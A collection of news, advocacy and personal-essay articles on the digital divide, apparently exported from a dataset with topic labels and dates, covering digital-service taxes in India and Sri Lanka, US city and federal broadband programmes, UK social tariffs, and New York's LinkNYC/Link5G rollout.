“The Reserve Bank of India (RBI) had ordered foreign payment companies to locally store data on all transactions taking place within India from October 15, 2018. Thus, global payment companies need to pay around 15% tax on their income from India, as they set up servers locally to comply with the RBI directive on data storage. The central government of India went further, by bringing a 2% digital service tax levy on all trade and services of foreign e-commerce companies through their Finance Bill of 2020-21. With that even companies like Amazon, Walmart-owned Flipkart and others having an annual turnover of ₹2 crore or more operating in India became liable for tax. The expanded equalisation levy became applicable from April 2021 to a range of digital services, including non-resident e-commerce operators involved in the online sale of goods and provision of services.”

“The G20 summit and the Organisation for Economic Co-operation and Development meeting held in October 2021, made a new foray into global taxation rules. Accordingly, a decision was made to ensure that foreign multinational firms will pay a minimum 15% of their total revenue in countries they operate in, which means companies like Microsoft, Google, Amazon, etc, would pay a tax of 15% for their operations in India.”

“Subsequent to this, India and the US agreed that the Equalisation Levy currently in existence for US based companies, will count as a credit against future taxes. The credits will be accounted for from April 1, 2022, until either March 31, 2024, or whenever the global taxes law comes into force. In the meantime, India continues to levy the 2% equalisation tax as credits.”

FITIS is of the view that it is more than time for Sri Lanka to take a leaf from India’s regulatory policy book. Channa de Silva says, “It is vital for a country like ours, which is almost exclusively reliant on foreign investment in order to progress, to recognize the importance and impact of the economic bolster provided by local companies. A right step in this direction would be to concede that as of now, there is no level playing field between International digital companies and local companies, businesses and startups. International digital players in Sri Lanka are exempt from paying taxes, whereas local enterprises that offer the same services are subject to taxes — more than before in the current economic crisis.”

“The Central Bank of Sri Lanka, was aware of the inequality because they highlighted it in their 2019 report that says ‘gig platforms, which are operating worldwide despite being based in a particular country, are difficult to be controlled by the host country’s regulatory environment and taxation system in the absence of local business registration. In contrast, local platforms are under regulatory scrutiny and are liable for local taxes. Such differences in the applicability of regulation will not ensure a level playing field for local operators.”

“Taking steps to bring in regulations to tax non-domiciled businesses is no longer a choice but a necessity. Apart from guaranteeing a level playing field and equal opportunity for local digital players, this will save us much needed dollars that are necessary to sustain the people of this country,” Channa de Silva says.",Digital Inequality,2022-06-13 00:09:11

Closing the K–12 Digital Divide in the Age of Distance Learning.","It took a pandemic to make us aware

The transition to work from home (WFH), learn from home (LFH), and telehealth forced by the COVID pandemic highlighted the digital divide in underserved rural and urban areas. In the U.S., the goal to bridge the digital divide has bipartisan support. President Joseph Biden’s infrastructure plan seeks to bridge the digital divide by bringing affordable, reliable, high-speed broadband to every American through an investment of USD 100 billion.

Be part of the solution: Register for the upcoming IEEE CQR Digital Divide workshop

The digital divide is not just an access issue. The pandemic exposed the issues of affordability, quality of coverage, and technical skills needed to get children online. According to research from Common Sense Media, nine million students in the U.S. lacked both home connectivity and an internet-enabled device. The study found vulnerable students lived in rural areas, federally subsidized or unstable housing, and were impacted by a variety of other demographic factors, including poverty, disability, language and race. The reality of the divide was made strikingly obvious to so many as schools scrambled to provide laptops and mobile devices to connect students when COVID-19 sent students home to online learning. Much of the lesson time was spent giving instruction on how to use the tools, find online teaching resources, and modify teaching methods to deliver online instruction.

The Nation Urban League (NUL) has also addressed the digital divide through the Lewis Latimer Plan. This plan calls for deployment of broadband networks to every household with steps to improve affordability and delivery of services while including underserved communities in the development of the digital economy. In a recent press release, NUL President and CEO Marc H. Morial stated, “As the COVID-19 pandemic has so starkly illuminated, broadband is a necessity, not a nicety. Even where networks are available, tens of millions of Americans have not adopted broadband in their homes—either because they can’t afford it or they don’t know how to use it.” Morial also noted that “…the Adoption Gap is approximately three times larger than the Availability Gap.”[1] Edward Smith II, NUL Senior Director for the Latimer Plan, added, “If adopted, the Latimer Plan would improve how our country delivers healthcare, education, job training, and other government services in ways that will benefit all Americans, especially those in marginalized communities.” [2]

Nicole Turner Lee of the Brookings Institute has been a public proponent on closing the digital divide. In her March 22 Tech Tank Podcast “To Build Back Better, The U.S. Needs A Digital Service Corps”[3], she advocated for programs to create a diverse digital service corps to build the pipeline of talent to help close the knowledge and adoption gap.

A digital economy works when everyone has the opportunity to participate

During the COVID pandemic, WFH (Work from Home), LFH (Learn from Home) and telehealth visits became the norm around the globe—those trends are not going away and there are dramatic shifts in the use of ICT infrastructure that accompany those changes. Previously relied-upon quality high-speed internet access at a school or business is no longer assured, particularly with many households, each with multiple family members, needing access for applications simultaneously demanding increased bandwidth. In its letter to the President in October 2020, the National Security Telecommunications Advisory Committee (NSTAC), noted that peak network traffic demand shifted in location, time of day, duration and the types of services leveraged as working from home, telehealth and distance learning increased.[4] In the period of March through July 2020, CTIA, which represents the U.S. wireless communications industry, reported that its mobile provider members experienced a 19.6 percent increase in data traffic, 24.3 percent increase in voice traffic, and 25 percent increase in texting.[5] Wireline infrastructure traffic also grew substantially in the early period of COVID, later leveling off to an average of 10 percent increase, per USTelecom.[6]

In a December 2020 Harvard Business Review article, it was noted that, despite the dramatic impacts COVID-19 had on people’s lives, the U.S. scored second highest in digital evolution maturity, behind only Singapore. The study goes on to explain that the successful countries prioritize:

expanding adoption of digital consumer tools (e-commerce, digital payments, entertainment, and the like) attracting, training, and retaining digital talent fostering digital entrepreneurial ventures providing fast, universal, terrestrial (such as fiber optics) and mobile broadband internet access specializing in the export of digital goods, services, or media coordinating innovation between universities, businesses, and digital authorities[7]

A stable and high-performing economy requires a digitally adept base of workers, students, and providers of essential services. It is clear that the workforce of the future is going to be increasingly reliant on locally available, uniform, high-speed internet access as WFH/LFH/telehealth patterns stabilize—if this requirement is unmet in certain areas, the existing problem of the digital divide will only increase.

We have the technology to solve this today

Bridging the digital divide is a problem that requires solutions for accessibility, affordability, and digital skills that touch social economics, infrastructure, and technology. Solutions require consideration for distribution of online devices, technical instruction to safely and productively use those devices and the internet, geography for the installation of internet access, affordability of that access, quality of access to enable productive WFH/LFH participation, and security to ensure that people are not exploited. If the goal is to have digital inclusion as quickly as possible, then consideration also needs to be made for the cost and timeline to build internet access in underserved areas when choosing between fiber optic, satellite and 5G wireless connectivity. Technology such as fixed wireless access (FWA), advanced antenna systems (including MIMO), network slicing capabilities, and network automation and performance monitoring can be deployed to optimize the quality of wireless access. These options are available to us today—it is now a matter of selecting and applying the best technologies to solve the problem.

IEEE CQR invites you to be part of the solution

The Institute of Electrical and Electronics Engineers (www.ieee.org) is the world's largest association of technical professionals with more than 400,000 members in over 160 countries. While its purpose is the educational and technical advancement of electrical engineering, telecommunications, computer engineering and allied disciplines, its mission is to advance technology for humanity. It is with that mission in mind that the IEEE Communication Society’s technical committee for Communications Quality and Reliability (CQR) is hosting a virtual workshop on Thursday, May 13 to address solutions to bridge the digital divide. CQR is honored that this workshop will have keynotes from Edward “Smitty” Smith, former FCC official now with DLAPiper, and Dan Sjöblom, Director General of the Swedish Post and Telecom Authority (PTS). The workshop will also feature a panel discussion with Nicol Turner-Lee, Senior Fellow at the Brookings Institute, Eric Burger, Georgetown University and formerly of the FCC and White House Office of Science and Technology Policy, and Bhushan Joshi, Head of Sustainability & Corporate Responsibility for Ericsson North America. Industry technical talks presented by leaders from Blu Wireless, Ericsson, Microsoft, Ookla, Senza Fili, Telenor, and Verizon will address important topics of reachability, equity, and extensibility to build an effective solution that bridge the digital divide. These talks will provide thoughtful examination of the variety of technologies that enable quality access for digital inclusion, with the goal to have the word “underserved” removed from daily lexicon.

Together we can solve this

According to the World Economic Forum, some 3.5 billion people globally do not have reliable access to broadband. Ericsson has partnered with Giga, an initiative launched by UNICEF and ITU to connect every school to the Internet and every young person to information, opportunity and choice. Also, Ericsson co-founded the Connect To Learn initiative with the Earth Institute at Columbia University and Millennium Promise to focus on delivering connectivity and ICT tools to enhance teaching and learning in unconnected, underprivileged and largely unrepresented communities. It is important to implement initiatives to provide affordable access and services that facilitate adoption and use of the digital economy to close the digital divide. We are proud to work for Ericsson, a company taking action, and to contribute to IEEE CQR’s focus on solving this problem.

Innovators will be able to draw on expert advice from U.K. and U.S. regulators

The United Nations (UN) estimates that up to $2 trillion of cross-border money laundering takes place each year, financing organised crime and undermining economic prosperity. Greater information sharing and collaborative analytics among financial organisations could transform the detection of this activity, but research by the Royal United Services Institute (RUSI) shows this is hindered by the legal, technical and ethical challenges involved in jointly analysing sensitive information.

Financial crime is among those global challenges that PETs could play a transformative role in addressing.

Today, the U.K. and U.S. governments are developing prize challenges focused on advancing the maturity of privacy-enhancing technologies (PETs) to combat financial crime.

Speaking at the Global Leaders Innovation Summit during London Tech Week in the U.K., Julia Lopez, the Minister for Media, Data and Digital Infrastructure at the Department for Digital, Culture, Media and Sport (DCMS), outlined how PETs can be harnessed to tackle global challenges - from the COVID-19 pandemic to human trafficking - by enabling insights to be derived from sensitive data, while protecting individuals’ privacy and proprietary information.

PETs include maturing technologies, such as federated learning, which allows machine learning models to be trained on high quality datasets, without the data leaving safe environments. Such technologies have the potential to help facilitate privacy-preserving financial information sharing and collaborative analytics; allowing suspicious types of behaviour to be identified without compromising the privacy of individuals, or requiring the transfer of data between institutions or across borders. Through the U.S. and U.K. prize challenges, innovators will develop state-of-the-art privacy-preserving federated learning solutions that help to tackle the barriers to the wider use of these technologies.

Research by the Financial Action Task Force (FATF) has found that uncertainty about the regulatory implications of using these technologies is a significant barrier to adoption. As part of the PETs prize challenges, innovators will be able to engage with regulators, including the U.K.’s Financial Conduct Authority (FCA) and Information Commissioner’s Office (ICO), and the U.S.’ Financial Crimes Enforcement Network (FinCEN).

The U.K.-U.S. collaboration on the PETs prize challenges was first announced at the Summit for Democracy in December 2021. Since then, the U.K.’s Centre for Data Ethics and Innovation (CDEI) and Innovate U.K. have been working with the White House’s Office of Science and Technology Policy (OSTP), the U.S. National Institute of Standards and Technology (NIST), and the U.S. National Science Foundation (NSF) to take the prize challenges forward.

The challenges will open to innovators on both sides of the Atlantic this summer. Challenge solutions will be showcased in the second Summit for Democracy, to be convened by President Joe Biden, in early 2023.

The PETs prize challenges form part of a broader CDEI work programme, also announced today, focused on enabling responsible data access. This multi-year programme will pilot and scale new approaches to enabling trustworthy access to data, working with partners across government, industry and regulators.

Julia Lopez, Minister for Media, Data and Digital Infrastructure at the Department for Digital, Culture, Media and Sport, said: “I’m delighted that the U.K. and U.S. are working with regulators on both sides of the Atlantic to help realise the potential of novel privacy-enhancing technologies (PETs) to tackle financial crime. The U.K.’s National Data Strategy outlines the promise of PETs in enabling trustworthy data access. PETs have the potential to facilitate new forms of data collaboration to tackle the harms of money laundering, while protecting citizens’ privacy.”

Dr. Alondra Nelson, Director of the White House Office of Science and Technology Policy, said: “Data can be marshalled to make life easier and more just. But too often, powerful data tools are instead used to deepen inequality and threaten our most basic freedoms. The PETs prize challenges seek to close that gap and demonstrate how these tools can be used responsibly to achieve their potential across many areas – from improving access to healthcare and addressing the climate crisis to advancing financial security and ending human trafficking. This important initiative is an expression of our shared vision: a world where our technologies reflect our values and innovation opens the door to solutions that make us more secure.”

“The structural inequalities of the digital divide rest on ‘digital red-lining’ that is built on top of urban red-lining.”

“If one (iPad) connects and the other doesn’t, I’m screwed,” Berroa said. “There’s nothing I can do. Sometimes it doesn’t connect at all during the day. My daughter is a first grader. She’s learning how to read right now. And I have no idea what’s going on.”

It is not an uncommon predicament. In 2020, the Federal Communications Commission (FCC) found that twenty-one million Americans lacked access to high-speed Internet; of these, 5.1 million homes were in rural areas while the rest were non-rural. In response, city governments and local groups throughout the country are attempting to address the digital divide in different, innovative ways.

Joshua Breitbart, a leadership in government fellow at the Open Society Foundations and New York City’s former deputy chief technology officer, tells The Progressive that “the structural inequalities of the digital divide rest on ‘digital red-lining’ that is built on top of urban red-lining.” He calls for delivering broadband “with a real eye at repairing and understanding the need for justice, of the inequity and trauma built into so many urban communities.”

What follows are snapshots of efforts being undertaken by nine U.S. cities that illustrate different strategies being adopted to end the urban digital divide.

Baltimore, Maryland

In 2018, according to the U.S. Census Bureau’s American Community Survey, 40.7 percent of city households—96,000 households—lacked wireless Internet service and that 75,000 households—one in three—did not have a desktop or laptop computer. To address this situation, the Baltimore Digital Equity Coalition was formed in March 2020 as a backbone support organization focused on collaboration. It now has more than sixty participating organizations. Using FCC funding through the Emergency Broadband Benefit, the coalition offers participants a $50 per month home Internet credit.

Chicago, Illinois

In June 2020, Chicago Public Schools launched “Chicago Connected,” a $50 million plan to provide students with no-cost broadband Internet over the next four years. The plan, said Mayor Lori Lighfoot, “has been successful in ensuring our students and their families have the resources they need to attend and engage in school during this unprecedented time.” It purports to be on track to reach 100,000 students by the end of the 2020-2021 school year.

Cleveland, Ohio

The 2019 American Community Survey reported that about 80,000 city households lacked wire line broadband connection and 31 percent didn’t have Internet subscriptions at any speed, including mobile data plans. DigitalC, a nonprofit wireless Internet provider, undertook a pilot project—“Connect the Unconnected”—providing devices and Internet access to more than 500 households in 156 public housing units and a homeless shelter. Earlier this year, it reached 1,100 residents and received grants of $20 million from two local foundations.

New York, New York

In January 2020, the city released an “Internet Master Plan” that declared: “The private market has failed to deliver the Internet in a way that works for all New Yorkers.” In July 2020, the city announced it would “make a historic $157 million investment in ending digital redlining and providing high-speed Internet, including $87 million redirected from the NYPD budget.”

“What we did for New York is develop a plan based on neighborhood scale,” says Breitbart, the city’s former Deputy Chief Technology Officer. “This was based on an understanding that there was no way to deliver on a citywide infrastructure.”

Philadelphia, Pennsylvania

Only 47 percent of households in the city’s low- and moderate-income tracts subscribe to broadband, well below households in middle- and upper-income neighborhoods (63 percent and 77 percent, respectively). Households in predominantly Latinx neighborhoods have the lowest subscription rates (47 percent), followed by 52 percent of households in predominantly Black neighborhoods and 76 percent of households in predominantly white tracts.

Alex Wermer-Colan of Temple University says that last year a grassroots group of volunteers from organizations around the city started a wireless mesh network project, working with an independent wireless service provider named PhillyWisper. He calls the service “net-neutral, affordable, point-to-point, and geographically well-positioned to provide WiFi” to the Norris Park Square area. “It’s a real community effort,” he says.

Pittsburgh, Pennsylvania

In 2018, around 30 percent of city residents didn’t have home access to the Internet. Like many other cities, minority and low-income communities have lower broadband subscription rates than the wider population. In response, Every1online, a community-based, nonprofit wireless Internet provider, was launched in 2015 to provide no-cost residential Internet access in the greater Pittsburgh area, especially directed at households with K-12 students.

San Antonio, Texas

The city has a total of 93,237 households without broadband of any type. Researchers found that “income disparities within the city decrease the use of broadband access at home.” To address this structural problem, San Antonio is investing $27 million for the “Connected Beyond the Classroom” program to ensure students are connected to their school networks, using federal CARES Act funding.

Tucson, Arizona

Some 32,000 city households lack reliable Internet access and more than 10,000 households have no Internet connection at all. In response, the Community Wireless Program was launched to provide wireless access to support remote learning, teleworking, and access to virtual services. The city used $4.4 million from the CARES Act to provide routers to eligible residents, including families with at least one school-aged child or college student in the home as well as someone sixty years of age or older or someone who is immunocompromised.

Whether the United States can close the digital divide—in both cities and rural areas—may depend on the ongoing Congressional battle over the $3.5 trillion reconciliation bill. Last month, the Senate passed a $1.2 trillion infrastructure bill that included $65 billion for broadband.

“Other funding in the bill, like the Digital Equity Act, can do good work in urban areas, but as long as it leaves the incumbent business model in complete dominance of the market, even with subsidies to make it more affordable, we will never have universal service,” Breitbart says.

But questions are being raised as to how much of the funding will go to cities. Wermer-Colan worries that the infrastructure bill now before Congress won’t really close the digital divide.

“All this is very unclear, but the more important question is where is that money going? Is it going to private monopolies?” he asks. “The earlier program was a great program in the sense that it was the best the city could do in an emergency, but it is in no way a viable future plan to end the digital divide.”

Today, The Fabian Society published a new report about digital inequality: Bridging the Divide.

BT was pleased to support the research in the report, which includes a thorough analysis of which groups of people are not online, or barely use the internet, and the reasons for this.

This report comes at an important time. The pandemic has shown us the value of technology. Good broadband can be a route to improve lives and widen opportunities, but not if the costs are prohibitive for millions of people. BT’s Home Essentials is a necessity for many, offering at-cost broadband to everyone on universal credit. As an economic squeeze takes hold, it is now urgent that the rest of the industry plays their role and brings in this sort of social tariff, and that Government looks at what more they can do to offer further support for those at the sharp end.

The Fabian Society’s first recommendation is ‘a mandatory social tariff, available from all internet providers’.

BT strongly supports this, and has provided a form of social tariff for telephone and broadband services for many years. However, we are disappointed that other major communications providers have not responded to the Government’s calls to introduce a social tariff for broadband so far.

BT takes its responsibilities here seriously, launching our new at-cost broadband social tariff, BT Home Essentials last year, having run BT Basic for many years before that. We have over 800,000 of our vulnerable customers on a range of subsidised or discounted tariffs.

However, other major operators do not, with Sky and Vodafone in particular refusing to launch social tariffs: on the basis that if BT offers one, they don’t need to. This cannot be right; and it is not tenable.

Today’s report also points out that Government has the power under the 2003 Comms Act to direct Ofcom to review the affordability and then impose regulatory social tariffs on all providers, and it is our view that the Government should now do so swiftly.

The think tank also proposes that social tariffs should be funded ‘through a broadband discount scheme, co-funded by government and the telecommunications industry’. Again, BT supports this idea.

As the economic outlook worsens, the numbers that could benefit from social tariffs are already in excess of 5 million and are set to increase further. This is a miserable prospect, and to put social tariffs at this scale on a sustainable footing the Government must at least part-fund them for the most vulnerable groups.

Industry can and should contribute to any funding: we believe that an operator’s share of the social tariff population should determine who pays what, with those operators that carry fewer social tariff customers contributing more.

BT also believe that in these changing times, policy makers must look again at whether the other sources of wealth in the internet value chain can play a greater role and contribute more fairly and sustainably to the ever increasing costs.

It's his second building, and he says the facility will let his workers compete, anchoring them in Wilson, about an hour outside the technology hub of Raleigh-Durham.

""It will be just as modern and advanced as other tech spaces you'd see in larger markets,"" O'Boyle said.

The city is in the midst of a technology boom that's driving economic growth throughout the region, thanks to speedy, affordable high-speed internet provided by a municipally-owned fiber optic network called Greenlight.

O'Boyle isn't the only one benefiting from Greenlight's ultra-fast service, which launched in 2008 and now serves nearly 11,000 customers. All of Wilson County's schools run on Greenlight broadband. The network powers a local co-working space and incubator for start-up entrepreneurs. And every new home in the area built by local developer Hunter Stone is wired for upload and download speeds of up to 1,000 megabits per second. That's fast enough to download a DVD's worth of content in about 40 seconds.

""Before in rural America, you could not get high-speed broadband Internet, and now you can come out here and have country living, be close to a grocery store, good schools, low crime, and it all works,"" Stone said.

That digital divide, which has persisted for years, is why the US government is now eyeing an ambitious proposal to invest tens of billions of dollars to ensure every American enjoys the same quality internet access that Wilson residents now do. But the effort has sparked political fights over how much money to spend, where to spend it and what types of internet access Americans need to stay competitive in the 21st century.

President Joe Biden has called for spending $100 billion to upgrade America's broadband infrastructure , particularly in unserved and underserved areas. That includes households that have no internet access at all, a situation affecting about 17 million schoolchildren, according to the Federal Communications Commission. It also includes areas that lack much competition, where just one or two providers offer broadband speeds — defined as download speeds of 25 Mbps or faster and upload speeds of 3 Mbps or faster. According to FCC data, roughly two-thirds of Americans live in one of these areas.

A problem hidden in plain sight

For years, many broadband advocates have said the problem is even worse than the official numbers suggest because of a quirk in FCC methodology. The agency considers a Census tract served by broadband internet even if only one household in that entire area has broadband access. That methodology means some regions may appear flush with connectivity, when the reality may be just the opposite.

""You can't spend any money until you redo the maps,"" said Blair Levin, a former senior FCC official and a policy analyst at the investment firm New Street Research, during an April investor call.

The FCC this year embarked on a project to do just that. The agency intends to collect fresh, standardized data from internet providers about where they offer broadband service — then plot that on a map and allow the public to submit challenges where the reality doesn't measure up to providers' claims.

While the idea may seem simple — and agency officials say it should have been done long ago — the initiative is enormously complex, requiring multiple interlocking datasets and a technology platform to display it all. Last year, Congress appropriated $98 million for the project.

""The best time to update our broadband maps would have been four years ago; the second-best time is now,"" said FCC Acting Chairwoman Jessica Rosenworcel. ""It's why I made it one of my top priorities, and why we're making the short-term fixes necessary to improve the data we currently collect and the long-term investments necessary to get this important undertaking right. You can't manage a problem you can't measure.""

Proposals for the mapping portion of the project are due July 1. But the data problems are just the first in a series of thorny challenges in closing the digital divide.

Biden's initial proposal on broadband funding has faced opposition by Senate Republicans, who have persuaded him to shrink the package to $65 billion. But the size of the plan isn't the only area where Biden has run into resistance.

Shifting priority to community providers

Historically, the government has subsidized the building of broadband networks by offering incentives to private companies such as Verizon, Comcast and AT&T (which owns WarnerMedia, CNN's parent company).

But in a break from the past, Biden's proposal calls for prioritizing funding, for the first time, to the kind of community-built networks you'd find in Wilson. And the plan isn't just focused on building out broadband in rural or outlying areas. Some of the most persistent examples of the digital divide can be found in dense urban neighborhoods struggling with poverty or inequality. In many of these areas, local organizations have had to step in where commercial internet providers saw little potential profit.

In Cleveland, Ohio, some 44% of homes lack broadband, according to a 2018 report by the National Digital Inclusion Alliance. Monica Malik once lived in one of these households. When the pandemic began, she said, she had no internet access at all. ""No one was servicing over here,"" she said. ""I don't know why.""

Now she pays $19 a month for service that allows her to run her own business selling natural oils and fragrances -- and to keep her 10-year-old son in school. That's thanks to DigitalC, a local non-profit that's building out fixed wireless networks by putting advanced millimeter-wave antennas on rooftops and helping to connect low-income households.

The White House wants to support these initiatives by local governments, non-profits and cooperatives, it has said, because they provide services with ""less pressure to turn profits and with a commitment to serving entire communities.""

Commercial internet providers have bristled at that language.

""We realize that rural co-ops or local governments may be the best solution in some unserved communities, but the government shouldn't irrationally favor one solution over others,"" said NCTA, a cable industry trade group, in a recent blog post . ""The privately funded broadband industry has achieved spectacular results over the last decade and most notably met the enormous challenge of the pandemic, keeping Americans working from home, learning remotely, and using telehealth to stay safe.""

The industry has succeeded in preventing more projects like Wilson's. More than a dozen states have laws on the books restricting municipalities from competing with commercial internet providers, according to the Institute for Local Self-Reliance, a non-profit advocacy group. And some Republicans in Congress have sought to elevate those limitations to the federal level with a bill that would ban municipal networks outright.

Proponents have argued that by providing a public option for broadband access, cities can inject competition into markets that have been abandoned by private providers or are lacking competition.

""Municipal networks like those in Chattanooga, Tennessee and Wilson, North Carolina put to lie the claim that local governments can't build and operate first-class information infrastructure,"" wrote Ry Marcattilio-McCracken, a senior researcher with ISLR, in a recent blog post . ""The big monopoly ISPs have left huge gaps all over the country as they prioritize investment based on returning short-term profits that extract wealth from communities.""

How fast should public internet be?

Yet even if the White House can agree with Congress on allowing and funding the expansion of public networks, there remains a question of how fast the technology should be in both public and private networks.

The US definition of broadband has not changed since 2015, when the FCC voted to adopt the current standard of 25 Mbps down, 3 Mbps up (before then, broadband was defined as 10 Mbps down and 1 Mbps up). The pandemic has tested that definition, as children and adults within the same household have been forced to share scarce bandwidth while spending hours on Zoom calls for work and school.

Whether the broadband standard will remain the same or be raised under the infrastructure bill is emerging as another focal point of the debate, because where the threshold is drawn could determine which technologies — cable, wireless, satellite or fiber — are best positioned to receive federal funding.

Fiber optic connections built straight into a home can reach tremendous sustained speeds — typically up to 1,000 Mbps. But fiber networks are also among the most expensive to build, and setting the target that high could wind up excluding other important technologies that still do a good job, or emerging technologies that hold a lot of promise, like 5G wireless data connections.

It's not clear what specific standard the Biden administration has in mind; the White House's initial plan called for ""future proof"" networks, which many experts have interpreted as a preference for fiber. But last month, the Treasury Department issued guidelines on how Covid-19 relief funds from the American Rescue Plan should be spent. Those guidelines suggested that providers only needed to hit a much lower target to seek funding, 100 Mbps, and there could be exceptions.

This could be a clue for where the Biden administration may end up in the infrastructure talks, according to Levin.

""These guidelines should be seen as the first concrete data for how at least some in the Administration (particularly at the Departments of Treasury and Commerce) view certain broadband policy cuts,"" he wrote in a recent analysis, adding that the guidelines were ""potentially predictive of the Administration's view of broadband issues in the infrastructure bill.""

And another clue? In March, a group of US senators also called for broadband standards to be raised to speeds of 100 Mbps down and 100 Mbps up. That group included West Virginia Democratic Sen. Joe Manchin, who is viewed as a key swing vote on any infrastructure bill.

Short-term solutions in a crisis

The pandemic forced millions of Americans to confront the lack of broadband access in their communities. In response, the US government has taken some short-term steps.

Last year, the FCC called on internet providers not to cut customers off who couldn't pay due to Covid-19. More recently, the agency launched a temporary program to help Americans struggling with their internet bills as a result of Covid-19. And this month, Vice President Kamala Harris, along with the Departments of Commerce and Interior, announced $1 billion in broadband grants for tribal lands, money that will aim to connect unserved Native American, Alaska Native and Native Hawaiian households.

But the infrastructure bill currently being negotiated is at least an order of magnitude larger, targets hundreds of millions of households and could make a substantial dent in the country's digital divide -- if Congress and the White House can come to a deal.",Digital Inequality,2021-06-09 07:00:00

As policymakers debate digital equity and inclusion, it’s important for them to hear voices like mine. Unlike some of my millennial peers, my family did not have access to a computer or broadband internet at our apartment in Los Angeles. We couldn’t afford to pay $70 a month for internet plus the other installation fees housing authority required. Lack of internet access was particularly difficult for me in high school. Often my teachers would assign homework that required me to go online. My solution was usually to use the computers at my local library until the building closed.

While attending community college, the problem worsened. I had to balance a full-time course load, a part-time job, and a part-time internship. My only spare time was at night, and the local library was closed by the time I could get there. The next closest public building in my neighborhood with free Wi-Fi access was the hospital. When I had no other choice, I spent late night hours working on assignments in the waiting area of the emergency room.

High-speed internet is no longer a luxury but a necessity. With a majority of the U.S. population connected to the internet, it’s very easy to forget about the people who don’t have internet access. Disconnected households are more likely to be low income and located in under-resourced communities.

In 2018, 87 percent of households with an annual income of $75,000 or more had access to the internet. In comparison, only 45 percent of households with an annual income of $30,000 or less were connected to the internet. Poor, rural communities are also left behind with only 58 percent of households there having internet access at home. Urban communities are less connected to broadband at home than suburban communities. The digital divide creates a steeper wall of inequity for communities of color that are more likely than their white counterparts to be disconnected.

To close the digital divide, we must promote more equitable solutions to ensure communities have full access to and use of affordable technologies. This includes reliable internet service, internet-enabled devices that meet user needs, digital literacy training, and the applications and online content that can help improve economic, social, health, and educational outcomes for impacted communities.

I know from my own experience that those on the disconnected side of the digital divide must work harder just to keep up with those who have the access and tools they need to fully participate in our rapidly changing world that so heavily depends on technology.",Digital Inequality,2019-04-26 07:00:00

Sign up for their newsletter here.

During a panel at a March tech summit in lower Manhattan, the CEO of CityBridge told attendees the pandemic exposed a stark “digital divide” across the five boroughs.

“It did really lay bare the sort of haves and have nots when it comes to digital technology,” explained Nick Colvin, whose tech consortium runs LinkNYC, the multi-use Wi-Fi and advertising kiosks, and Link5G, the forthcoming, supertall poles that add 5G signal transmission power.

What he didn’t tell the audience was that CityBridge largely failed to accomplish its goal of helping to bridge the digital divide in the six years after kiosk installation began. The company put the majority of its more than 1,800 LinkNYC units in Manhattan but relatively few in The Bronx, Brooklyn, Queens and Staten Island, where neighborhoods lack at-home and mobile broadband at a higher rate.

As THE CITY, the state comptroller and other news outlets have documented, the company fell short of ad revenue projections and was unable to pay $60 million it owed the city. The revenue shortfall resulted in an abrupt halt to kiosk installation, leaving many areas outside Manhattan without the access they were promised. The company faced bankruptcy in 2019. The city contemplated terminating the deal in 2020.

But despite the LinkNYC program’s history of delinquency, city officials are giving CityBridge another chance to bolster digital equity citywide: The company is now preparing to install hundreds of 32-foot-tall Link5G towers, beginning this summer.

The city Public Design Commission approved the Link5G design for commercial and manufacturing areas at a meeting in December. Members postponed a vote on a residential rollout in order to review data on the service and infrastructural impacts of the towers’ first wave.

The new structures will be more than three times as tall as the original LinkNYC design. Like their predecessors, the lower part of the new structures will have a 911 button, USB ports, a tablet, calling capabilities and advertising displays. The structures will also provide free Wi-Fi. But the new designs will be topped by fifth-generation cellular network technology, or 5G, which will radiate from their upper chambers to enabled devices at street level. Multiple telecom companies could pay CityBridge to house their 5G equipment inside the chambers of a single structure. Their payments would bring in a new revenue stream to CityBridge, funding the company’s operations and expanded footprint.

The structures’ signals will supplement existing 5G networks that currently provide consumers speedy wireless internet service. City officials and CityBridge insist that more cell sites are necessary given the technical specifications of 5G, which require a “line of sight” to work: 5G is carried on millimeter waves that, unlike 4G frequencies, cannot penetrate most surfaces, whether a building or a bus.

Citing a statistic from the New York City Internet Master Plan that nearly “40% of New York City households lack the combination of home and mobile broadband, including 18% of residents – more than 1.5 million people – who lack both,” CityBridge, along with the city’s Department of Information Technology and Telecommunications, have asserted that expanded 5G wireless service, paired with an “equitable deployment mandate,” will provide a crucial public benefit to underserved communities.

Yet why did the city salvage its franchise agreement with a company that could not deliver on its promises in the first place? The original Link kiosks were built atop a dated and obsolete network of public payphones that CityBridge continues to dismantle; now the city faces the prospect of making sure that what it’s long called the “largest, fastest municipal Wi-Fi system in the world” doesn’t itself become a stranded asset.

Beyond questions of whether or not the city can keep up in a rapidly changing landscape of technological products and innovation, can it make sure that its most under-resourced populations don’t get left behind, again?

Power for ‘Future Gs’

In 2014, CityBridge signed an agreement with the de Blasio administration, requiring the company to install at least 7,500 kiosks, while aiming for a lofty goal of 10,000. The company also committed to provide $500 million from ad revenue to the city’s coffers over 12 years — but fell well short. Maya Wiley, counsel to former Mayor Bill de Blasio at the time of LinkNYC’s launch in 2016, has taken credit for helping to negotiate the deal. Wiley, a former mayoral candidate, declined to comment through a spokesperson.

Under an amendment to the deal signed last year, CityBridge is now required to install and activate “no fewer than 4,000” structures by 2026. With the city’s approval, the company could eventually install 3,500 more than the required amount.

“Over the next five years, we’re deploying a little over 2,000 more structures, at the minimum,” Colvin told the crowd at the daylong City & State summit last month.

The deal gives CityBridge the power to convert the original kiosks to 20-foot-tall “retrofitted” 5G poles, or replace them completely with the 32-foot model, with or without the digital advertising screens that LinkNYC has become known for.

The amendment also marked a major shift in CityBridge’s business model.

Instead of relying on revenue from ad sales, the company is poised to see earnings from renting space inside the poles to telecom companies such as AT&T, Verizon and T-Mobile, which would complement their existing 5G infrastructure. Consumers would need a mobile data plan that includes 5G service for their devices to connect to that signal, though Wi-Fi will remain free.

“As with all 5G deployments, a user will need a 5G enabled device and plan to connect to the carriers’ 5G access point,” said Dan Levitan, a spokesperson for CityBridge.

New Yorkers wouldn’t experience more robust connectivity through the Link5G structures without a device, but they would when they get one, Levitan said.

“Over time, more and more New Yorkers will have 5G enabled phones, and it’s critical that 5G service reach all neighborhoods and communities,” he said. “5G service benefits all mobile network users by increasing capacity of the overall network.”

Levitan noted that 5G networks, currently consisting of carrier equipment on rooftops, light poles and other “smart” infrastructure, require even more transmission points than 4G networks “because the signal delivers more capacity but travels a shorter distance.”

“The challenge in a city like New York, is having enough available real estate to place carrier equipment,” Levitan said. “Without Link5G, the city would be limited to existing infrastructure that wasn’t designed to meet the specific needs of wireless technologies like 5G.”

He added that Link5G’s modular design allows structures to have “power, fiber and enough room for all carriers deploying 4G, 5G and the other Gs of the future.”

